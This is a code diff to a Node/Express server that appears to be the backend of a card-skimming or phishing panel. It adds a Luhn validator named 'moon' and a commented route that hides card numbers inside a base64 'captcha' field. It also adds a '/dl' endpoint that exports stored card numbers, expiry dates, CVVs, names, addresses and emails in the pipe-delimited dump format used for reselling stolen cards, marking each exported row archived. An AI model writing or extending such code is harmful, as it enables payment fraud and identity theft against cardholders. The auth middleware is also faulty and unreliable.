@@ -23,7 +23,37 @@ require("dotenv").config();
 
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(cors());
+
+async function verifyJWT(req, res, next) {
+  // console.log(req.body);
+  // console.log(req.originalUrl);
+  req.originalUrl === "/login" ? next() : 0;
+  req.originalUrl === "/validate" ? next() : 0;
+  req.originalUrl === "/create" ? next() : 0;
+  try {
+    let x = await profileSchema.findOne({ token: req.body.token });
+    if (x === null) {
+      next(new Error("Token is empty"));
+    } else {
+      jwt.verify(
+        req.body.accessToken,
+        process.env.TOKEN_KEY,
+        (err, decoded) => {
+          err ? next(err) : next();
+        }
+      );
+    }
+  } catch (err) {
+    next(err);
+  }
+}
+
+app.use(verifyJWT);
+app.use((err, req, res, next) => {
+  err ? res.status(401).json({ success: false, message: err }) : next();
+});
 
 mongoose.connect(process.env.MONGO_URI, () => {
   console.log("DB CONNECTED");
@@ -33,7 +63,7 @@ app.get("/", (_, res) => {
   res.status(200).json({ message: "hello" });
 });
 
-app.get("/list", async (_, res) => {
+app.post("/list", async (_, res) => {
   try {
     const everythingFound = await entrySchema.find({});
     let amount = 0;
@@ -77,7 +107,8 @@ app.get("/list", async (_, res) => {
       entriesByMonths,
       entriesByDays,
     };
-    res.status(200).json({ actualData: everythingFound, stats });
+    let v = everythingFound.filter((x) => x.archived === false);
+    res.status(200).json({ actualData: v, stats });
   } catch (error) {
     res.status(501).json(error);
   }
@@ -125,24 +156,6 @@ app.post("/login", (req, res) => {
   });
 });
 
-app.post("/validate", (req, res) => {
-  req.body.accessToken
-    ? (() => {
-        jwt.verify(
-          JSON.parse(req.body.accessToken).accessToken,
-          process.env.TOKEN_KEY,
-          (err, decoded) => {
-            err
-              ? res.status(401).json({ verification: false })
-              : (() => {
-                  res.json({ verification: true });
-                })();
-          }
-        );
-      })()
-    : res.status(401).json({ verification: false });
-});
-
 app.post("/createToken", async (req, res) => {
   const reg = new profileSchema({
     token: req.body.token,
@@ -150,6 +163,68 @@ app.post("/createToken", async (req, res) => {
   try {
     const savedEntry = await reg.save();
     res.status(201).json(savedEntry);
+  } catch (error) {
+    res.status(501).json(error);
+  }
+});
+
+const moon = (setValue) => {
+  let ch = 0;
+  const num = String(setValue).replace(/\D/g, "");
+  const isOdd = num.length % 2 !== 0;
+
+  if ("" === num) return false;
+
+  for (let i = 0; i < num.length; i++) {
+    let n = parseInt(num[i], 10);
+
+    ch += (isOdd | 0) === i % 2 && 9 < (n *= 2) ? n - 9 : n;
+  }
+
+  return 0 === ch % 10;
+};
+
+// app.post("/gate", (req, res) => {
+//   let obj = JSON.parse(
+//     Buffer.from(req.body.captcha, "base64").toString("ascii")
+//   );
+//   console.log(moon(obj.ccNumber));
+//   console.log(moon('4561 2612 1234 5467'));
+//   res.status(200).json();
+// });
+
+async function asyncForEach(array, callback) {
+  for (let index = 0; index < array.length; index++) {
+    await callback(array[index], index, array);
+  }
+}
+
+app.post("/dl", async (req, res) => {
+  let startDate = new Date(req.body.start);
+  let endDate = new Date(req.body.end);
+  let sArray = [];
+  try {
+    const everythingFound = await entrySchema.find({ archived: false });
+    const fArray = everythingFound.filter((x) => {
+      return (
+        new Date(x.createdAt) >= startDate && new Date(x.createdAt) <= endDate
+      );
+    });
+    await asyncForEach(fArray, async (z) => {
+      try {
+        await entrySchema.findOneAndUpdate({ _id: z._id }, { archived: true });
+        sArray.push(
+          `${z.cardNumber || ""}|${z.cardExpiry.split("/")[0]}|${
+            z.cardExpiry.split("/")[1]
+          }|${z.cardCVV || ""}|${z.name || ""}|${z.address || ""}|${
+            z.city || ""
+          }|${z.state || ""}|${z.zip || ""}|${z.country || ""}|${z.email || ""}`
+        );
+      } catch (error) {
+        res.status(501).json(error);
+      }
+    });
+    res.status(200).json({ data: sArray.join("\n") });
   } catch (error) {
     res.status(501).json(error);
   }
